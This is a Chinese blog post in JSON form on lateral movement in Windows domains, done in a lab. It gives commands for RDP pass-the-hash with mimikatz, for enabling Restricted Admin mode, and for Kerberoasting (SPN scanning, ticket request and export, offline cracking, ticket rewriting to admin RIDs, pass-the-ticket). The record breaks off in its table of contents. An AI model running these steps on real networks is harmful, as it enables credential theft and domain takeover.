{"title":"内网安全-域横向渗透【四】","uid":"377bf3c0ff3344364d83fd8924788afb","slug":"内网安全-域横向渗透【四】","date":"2022-06-30T02:12:36.000Z","updated":"2022-06-30T09:07:01.865Z","comments":true,"path":"api/articles/内网安全-域横向渗透【四】.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>脑图：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%8E%AF%E5%A2%83.png\" alt=\"横向渗透-域环境\"></p>\n<h2 id=\"0x01-RDP传递-Mimikatz\"><a href=\"#0x01-RDP传递-Mimikatz\" class=\"headerlink\" title=\"0x01 RDP传递-Mimikatz\"></a>0x01 RDP传递-Mimikatz</h2><h3 id=\"0x00-RDP介绍\"><a href=\"#0x00-RDP介绍\" class=\"headerlink\" title=\"0x00 RDP介绍\"></a>0x00 RDP介绍</h3><p>远程桌面协议(RDP)是一个多通道的协议，让使用者(所在计算机称为用户端或’本地计算机’)连上提供微软终端机服务的计算机(称为服务端或’远程计算机’)。</p>\n<p>大部分的Windows版本都有用户端所需软件，有些其他操作系统也有这些用户端软件，例如Linux,FreeBSD，MacOSX，服务端计算机方面，使用TCP3389端口。</p>\n<h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><ul>\n<li><p>RDP协议也可以传输明文密码或HASH密文进行连接操作；</p>\n</li>\n<li><p>RDP协议连接：端口扫描判断对方远程桌面是否开启（3389）；</p>\n</li>\n<li><p>对方主机必须打开允许远程桌面连接：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630104101201.png\" alt=\"image-20220630104101201\"></p>\n</li>\n<li><p>RDP明文密码连接：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Windows: mstsc\nmstsc.exe &#x2F;console &#x2F;v192.168.3.21 &#x2F;admin\nlinux: rdesktop 192.168.3.21:3389<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>RDPHash密文连接：</p>\n</li>\n</ul>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；</p></blockquote>\n<p>开启命令：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">REG ADD “HKLM\\System\\CurrentControlSet\\Control\\Lsa” &#x2F;v \nDisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>开启后运行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mstsc.exe &#x2F;restrictedadmin\nmimikatz.exe\nprivilege::debug\nsekurlsa::pth &#x2F;user:administrator &#x2F;domain:god &#x2F;ntlm:ccef208c6485269c20db2cad21734fe7 “&#x2F;run:mstsc.exe &#x2F;restrictedadmin”<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"0x02-SPN服务-探针-请求-破解-重写\"><a href=\"#0x02-SPN服务-探针-请求-破解-重写\" class=\"headerlink\" title=\"0x02 SPN服务-探针,请求,破解,重写\"></a>0x02 SPN服务-探针,请求,破解,重写</h2><h3 id=\"0x00-SPN介绍\"><a href=\"#0x00-SPN介绍\" class=\"headerlink\" title=\"0x00 SPN介绍\"></a>0x00 SPN介绍</h3><p>服务主体名称（SPN）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定的服务实例可以具有多个SPN。例如，SPN总是包含运行服务实例的主机名称，所以服务实例可以为其主机的每个名称或别名注册一个SPN。</p>\n<h3 id=\"0x01-SPN扫描\"><a href=\"#0x01-SPN扫描\" class=\"headerlink\" title=\"0x01 SPN扫描\"></a>0x01 SPN扫描</h3><p>1、当计算机加入域时，主SPN会自动添加到域的计算机账号的ServicePrincipalName属性中；在安装新的服务后，SPN也会被记录在计算机账号的\t相应属性中。</p>\n<p>2、SPN扫描也可以叫扫描Kerberos服务实例名称，在Active Directory环境中发现服务的最佳方法是通过“SPN扫描”。通过请求特定SPN类型的服务主体名称来查找服务，SPN扫描攻击者通过网络端口扫描的主要好处是SPN扫描不需要连接到网络上的每个IP来检查服务端口。SPN扫描通过LDAP查询向域控制器执行服务发现。由于SPN查询是普通Kerberos票据的一部分，因此如果不能被查询，但可以用网络端口扫描来确认。</p>\n<p>3、由于SPN扫描是基于LDAP协议向域控制器进行查询的，所以，攻击者只需要获得一个普通的域用户权限，就可以进行SPN扫描。</p>\n<p>4、<strong>攻击过程：</strong>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>SPN扫描流程：</p>\n<p>探针-请求-破解-重写</p>\n<p>优点：优于工具的端口扫描，不容易被防火墙等防护软件所触发，同时也可以探针服务，速度很快。</p></blockquote>\n<h3 id=\"0x02-探针\"><a href=\"#0x02-探针\" class=\"headerlink\" title=\"0x02 探针\"></a>0x02 探针</h3><p>1、查看是否在域内：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630111616065.png\" alt=\"image-20220630111616065\"></p>\n<p>2、调用spn扫描（自带的）：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">setspn -q *&#x2F;* #扫描全部<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630111754727.png\" alt=\"image-20220630111754727\"></p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630111954277.png\" alt=\"image-20220630111954277\"></p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630111902984.png\" alt=\"image-20220630111902984\"></p>\n<p>探针到相应的服务：WEBSERVER，FILESERVER，SQLSERVER等。</p>\n<p>3、筛选指定服务：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">setspn -q *&#x2F;* | findstr &quot;MSSQL&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630112625948.png\" alt=\"image-20220630112625948\"></p>\n<p>4、删除缓存票据：（防止干扰）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">klist purge<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630112843702.png\" alt=\"image-20220630112843702\"></p>\n<h3 id=\"0x03-请求\"><a href=\"#0x03-请求\" class=\"headerlink\" title=\"0x03 请求\"></a>0x03 请求</h3><p>1、使用powershell请求：（cmd命令行不能请求）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Add-Type -AssemblyName System.IdentityModel<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630113308532.png\" alt=\"image-20220630113308532\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>mimikatz请求 mimikatz.exe “kerberos::ask &#x2F;target:xxxx”</p></blockquote>\n<p>2、请求服务：（引号中填写探针到的服务名）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc&#x2F;sqlserver.test.com:1433&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630113648481.png\" alt=\"image-20220630113648481\"></p>\n<p>3、klist查看，多了一条MSSQL的请求：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630113720328.png\" alt=\"image-20220630113720328\"></p>\n<p>4、使用mimikatz导出票据：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mimikatz # kerberos::list &#x2F;export<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630114128816.png\" alt=\"image-20220630114128816\"></p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630114144655.png\" alt=\"image-20220630114144655\"></p>\n<h3 id=\"0x04-破解\"><a href=\"#0x04-破解\" class=\"headerlink\" title=\"0x04 破解\"></a>0x04 破解</h3><p>使用kerberoast爆破票据；</p>\n<p>（将爆破的票据放在kerberoast文件夹下）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">python3 tgsrepcrack.py passwd.txt 1-40a00000-webadmin@MSSQLSvc~sqlserver.test.com~1433-TEST.COM.kirbi\n#使用pytho3执行tgsrepcrack.py爆破脚本，密码字典为passwd&#x2F;txt，加上需要破解的票据<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630121822231.png\" alt=\"image-20220630121822231\"></p>\n<p>这里没有设置sqlserver的密码，导致没有爆破成功。</p>\n<h3 id=\"0x05-重写\"><a href=\"#0x05-重写\" class=\"headerlink\" title=\"0x05 重写\"></a>0x05 重写</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>-p 是得到的密码，-r 票据文件，-w 将票据文件重写为PENTESTLAB.kirbi，-u 指向用户名的编号，500是admin用户的标识，-g 指向组，512对应管理员组</p></blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">python kerberoast.py -p Password123 -r 1-40a00000-webadmin@MSSQLSvc~sqlserver.test.com~1433-TEST.COM.kirbi -w PENTESTLAB.kirbi -u 500<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91.htm/image-20220630155037935.png\" alt=\"image-20220630155037935\"></p>\n<p>这里报错了，但是可以看到生成了相应文件PENTESTLAB.kirbi</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p> 最后使用miikatz将生成的票据注入内存</p></blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mimikatz # kerberos::ptt xxxx.kirbi<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"0x06-总结\"><a href=\"#0x06-总结\" class=\"headerlink\" title=\"0x06 总结\"></a>0x06 总结</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>SPN主要用于探针，获取密码等等，重写一般不成功，获取不到sa权限的密码，只能获取到普通权限的密码，重写比较鸡肋。</p></blockquote>\n","text":"0x00脑图： 0x01 RDP传递-Mimikatz0x00 RDP介绍远程桌面协议(RDP)是一个多通道的协议，让使用者(所在计算机称为用户端或’本地计算机’)连上提供微软终端机服务的计算机(称为服务端或’远程计算机’)。 大部分的Windows版本都有用户端所需软件，有些其...","link":"","photos":[],"count_time":{"symbolsCount":"3.2k","symbolsTime":"3 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-RDP%E4%BC%A0%E9%80%92-Mimikatz\"><span class=\"toc-text\">0x01 RDP传递-Mimikatz</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-RDP%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">0x00 RDP介绍</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-SPN%E6%9C%8D%E5%8A%A1-%E6%8E%A2%E9%92%88-%E8%AF%B7%E6%B1%82-%E7%A0%B4%E8%A7%A3-%E9%87%8D%E5%86%99\"><span class=\"toc-text\">0x02 SPN服务-探针,请求,破解,重写</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-SPN%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">0x00 SPN介绍</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-SPN%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">0x01 SPN扫描</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" 